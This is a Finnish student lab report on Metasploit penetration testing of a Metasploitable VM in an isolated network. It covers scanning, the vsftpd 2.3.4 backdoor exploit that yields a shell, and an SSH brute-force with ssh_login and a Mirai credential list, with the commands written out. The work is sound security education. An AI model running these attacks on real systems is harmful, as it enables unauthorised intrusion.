![image](https://github.com/user-attachments/assets/44725e09-624c-41d4-9623-7773331d8b3a)# x) Lue/katso/kuuntele ja tiivist√§

## Chapter 1: Approaching a Penetration Test Using Metasploit

### Tunkeutumistestauksen hy√∂dyt metasploitablella

- Erilaisten j√§rjestelmien testaus mahdollista
- Avoin l√§hdekoodi
- Tiedon ker√§√§minen. Voi tallentaa erillisesti omaan tietokantaan tai tiedostoon.
- Payloadien vaihtaminen ja konfigurointi helppoa
- Ei kaada j√§rjestelm√§√§, jos poistuu hetkellisesti hy√∂k√§tt√§v√§st√§ koneesta.

### Case study ‚Äì reaching the domain controller

#### Tiedonkeruu
- db_nmap komennolla voi tallentaa skannauksen tietokantaan
- Kun tiedossa on j√§rjestelm√§n k√§ytt√∂j√§rjestelm√§ skannauksen avulla, voidaan ajaa hy√∂kk√§ys, jolla voidaan hy√∂k√§t√§ k√§ytt√∂j√§rjestelm√§√§n.

### Threat modeling
- Search - toiminnolla l√∂yt√§√§ tunnetut haavoittuvuudet
- Moduulin valinnassa tulee aina noudattaa seuraavia kriteerej√§:

`**Erinomainen:** Moduuli ei koskaan kaada palvelua.
**Hyv√§:** Moduulilla on oletusasetus tai se pystyy automaattisesti tunnistamaan oikean kohteen ja k√§ytt√§m√§√§n oikeita asetuksia versiontarkistuksen j√§lkeen.
**Kohtalainen:** Moduulilla on oletusasetus, ja haavoittuvuus on melko yleinen.
**Normaali:** Moduuli on yleens√§ luotettava, mutta riippuu tietyst√§ versiosta.
**Heikko:** Moduulin hy√∂dynnett√§vyys on alle 50 %, mik√§ tarkoittaa, ett√§ sit√§ on l√§hes mahdotonta hy√∂dynt√§√§ oletusasetuksissa. `

### Hyv√§ksik√§ytt√∂ ja p√§√§synsaanti
- "use <exploit/path/to/module>", lataa hy√∂kk√§yksen.
- "show options" n√§ytt√§√§ parametrit
- "exploit -j" ajaa hy√∂kk√§yksen taustalla.

### P√§√§synsaannin j√§lkeen
- Hy√∂kk√§ys kannattaa siirt√§√§ prosessiin, jota todenn√§k√∂isemmin ei suljeta, esim. powershellist√§ explorer.exe.
- Hy√∂kk√§√§j√§ tekee itsest√§√§n adminin, jotta p√§√§see k√§siksi domain controlleriin ja sen kautta Active Directoryyn, josta p√§√§see k√§siksi salasanatiivisteisiin.

# a) Harjoittelemme omassa virtuaaliverkossa, jossa on Kali ja Metaspoitable. Osoita testein, ett√§ 1) koneet eiv√§t saa yhteytt√§ Internetiin 2) Koneet saavat yhteyden toisiinsa.

## 1) Ei yhteytt√§ internettiin
![image](https://github.com/user-attachments/assets/464ff201-f9a5-4ef7-8a58-23774120af08)
![image](https://github.com/user-attachments/assets/cd7d9a68-3d12-4ce5-b725-e86ca73ad6d4)

## 2) Yhteys toiseen koneeseen
![image](https://github.com/user-attachments/assets/192458c5-b3b6-4089-b77d-d7e18791e7b0)
![image](https://github.com/user-attachments/assets/7006015f-afb5-4705-82d6-8ffe8205cea4)

# b) Ota Metasploit msfconsole k√§ytt√∂√∂n
![image](https://github.com/user-attachments/assets/7e45ea04-fa0a-47eb-a559-7b2351297afa)

# c) c) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, ett√§ l√∂ysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable.
### Ensiksi laitoin pyydetyn komennon konsoliin, saimme vastaukseksi, ett√§ tietokanta ei ole yhdistetty. L√∂ysin nopealla googlauksella videon avustuksella (https://www.youtube.com/watch?v=nHiUThZxhHY) ratkaisun ongelmaan. Palaamme takaisin kali:iin, jossa k√§yt√§mme komennon 'msfdb init', joka k√§ynnist√§√§ tietokannan metaspoitableen. Varmistan viel√§, ett√§ postgre-palvelu on k√§ynniss√§ komennolla 'sudo service postgresql start'.
![image](https://github.com/user-attachments/assets/ba7a8998-1ac0-4709-b036-aefa9ae72671)
### Tarkistin viel√§ nmap komennon yhteydess√§, ett√§ my√∂s olemme kohdentamassa oikeaa IP:t√§. 


# d) Porttiskannaa Metasploitable perusteellisesti. Tallenna tulokset Metasploitin tietokantoihin (db_nmap) ja tiedostoihin (nmap -oA foo).
### Ensiksi tallennamme tulokset metasploitin tietokantoihin: "db_nmap -A *IP*"
![image](https://github.com/user-attachments/assets/dbcb4870-1a33-4e49-879c-16bcb4e5be99)
### Saamme tulokset tiedostoihin k√§ytt√§m√§ll√§ -oA - fl√§gi√§: "nmap -oA h2_ms2 -A *IP*"
![image](https://github.com/user-attachments/assets/7ca8425b-835b-4684-a598-d7b7ea30be3d)

# e) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa n√§it√§ listoja tai hakea niist√§.
### Komennolla "services -h" saamme lis√§tietoa, miten services komentoa voi k√§ytt√§√§. Esimerkkin√§ suodatan porttiv√§li√§ 1-100, josta n√§emme haavoittuneet portit tuolla v√§lill√§.
![image](https://github.com/user-attachments/assets/86105508-6234-47e4-b2f7-b820a340b130)

# f) Vertaile nmap:n omaa tiedostoon tallennusta ja db_nmap:n tallennusta tietokantoihin. Mitk√§ ovat eri tiedostomuotojen ja Metasploitin tietokannan hyv√§t puolet?
### Kokeilin kahta tapaa grepata tiedostoja: file.nmap sek√§ file.gnmap. file.gnmap tulostuu heikosti, mutta file.nmap tulostuu luettavammaksi.
![image](https://github.com/user-attachments/assets/57102c88-0870-4570-a9c4-ec689170cdd9)

# g) Murtaudu Metasploitablen vsftpd-palveluun

### K√§yt√§n Jacobsin ohjeista kohtaa 3: Gaining access

    search vsftpd
    use exploit/unix/ftp/vsftpd_234_backdoor    # Valitaan haavoittuvuus, t√§ss√§ tapauksessa "exellent"
    set RHOSTS 192.168.56.109    # Hy√∂k√§t√§√§n metaspoitable koneeseen
    run    # ??? PROFIT
### P√§√§simme k√§siksi koneeseen, hy√∂kk√§ys ilmoittaa ett√§ l√∂ysimme shellin, kirjoitan shell, jonka j√§lkeen hy√∂kk√§ys ilmoittaa, ett√§ bash on valittavissa, kirjoitamme "bash", jonka j√§lkeen bash:in komentosy√∂te avautuu. P√§√§semme esimerkiksi kiinni koneen kansiorakenteeseen -> 'ls -la'.

![image](https://github.com/user-attachments/assets/02524e6f-9a0b-4c35-9e4c-ff58ca15aaba)

![image](https://github.com/user-attachments/assets/eaed2158-cafd-4989-9502-3410420c7c67)

![image](https://github.com/user-attachments/assets/8c3feb8f-e68a-4ff6-95d3-a482332a8e9a)

# j) Murtaudu Metasploitableen jollain toisella tavalla. SSH Bruteforce - hy√∂kk√§ys.

### Aikaisemmassa raportissa mainitsin, ett√§ metaspoitableen on auki SSH-portti, jonka voi todentaa aikaisemmasta porttiskannauksesta. Nopealla googlauksella sek√§ metaspoitablen search:illa l√∂yd√§mme muutaman mahdollisen hy√∂kk√§yksen. P√§√§dyin lopulta hy√∂kk√§√§m√§√§n brute forcella SSH:ta vastaan, sill√§ voin olettaa k√§ytt√§j√§tunnuksen sek√§ salasanan olevan heikkoja. Hy√∂kk√§yksess√§ my√∂hemmin valitaan k√§ytt√§j√§tunnus+salasana kirjasto, jolla hy√∂kk√§ys toteutetaan. Hy√∂kk√§ykseen kuitenkin tarvitaan muutama asetus:
        msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.56.109 # Asetetaan hy√∂k√§tt√§v√§n kohteen IP
        RHOSTS => 192.168.56.109
        msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 3             # Asetetaan ydin-m√§√§r√§ksi 3, yhden sijasta. N√§in saamme lis√§tehoa salasanan murtamiseen.
        THREADS => 3
        msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true  # Pys√§ytt√§√§ hy√∂kk√§yksen, kun oikeat tiedot l√∂ytyv√§t.
        STOP_ON_SUCCESS => true
        msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true          # Antaa informaatiota, miksi hy√∂kk√§ys ei mahdollisesti toimi
        VERBOSE => true
        msf6 auxiliary(scanner/ssh/ssh_login) > show options

![image](https://github.com/user-attachments/assets/da558a52-216a-4d80-8475-803d3468c613)
### Olemme melkein valmiita. Meid√§n viel√§ tulee lis√§t√§ `USERPASS_FILE`, joka sis√§lt√§√§ k√§ytt√§j√§tunnus+salasana yhdistelm√§t, joilla j√§rjestelm√§ murretaan. kali:ssa n√§m√§ listat l√∂yt√§√§ `/usr/share/wordlists`. Avataan viereen uusi terminaali.
![image](https://github.com/user-attachments/assets/a481f98e-fa43-4efa-b562-131540e99e3e)
### Heti k√§ttelyss√§ meille tarjotaan tuttua ja turvallista `rockyou.txt`-tiedostoa. T√§m√§ kuitenkin on eritt√§in suuri ja todenn√§k√∂isesti murtamisessa kest√§isi enemm√§n aikaa. Siksi p√§√§t√§n tarkistaa viel√§ muita jo valmiiksi olevia metaspoitablen listoja kansiosta `metaspoit`.
![image](https://github.com/user-attachments/assets/c9d1d076-ff3d-4ca2-aa2f-b387524fb6b1)
### Eniten t√§st√§ kansiosta minua kiinnostaa userpass - nimiset listat. P√§√§t√§n tarkistaa ensiksi mirai_user_pass.txt. Lopulta p√§√§tin k√§ytt√§√§ kyseist√§ listaa. Asetamme kyseisen listan k√§ytt√∂√∂n metaspoitablen terminaalissa.

    msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt
    USERPASS_FILE => /usr/share/wordlists/metasploit/mirai_user_pass.txt
![image](https://github.com/user-attachments/assets/61412373-2daa-44d5-8f2d-e5d948758e19)
![image](https://github.com/user-attachments/assets/c785621d-6df2-49bf-bf21-55c520a8038f)
### Seuraavaksi k√§yt√§mme run-komentoa, jolla hy√∂kk√§ys toteutetaan.
![image](https://github.com/user-attachments/assets/7065c00e-1222-42d9-a047-3f69d97fb5bf)
### Lopulta l√∂yd√§mme k√§ytt√§j√§tunnuksen sek√§ salasanan: "user/user" üòÇ






    







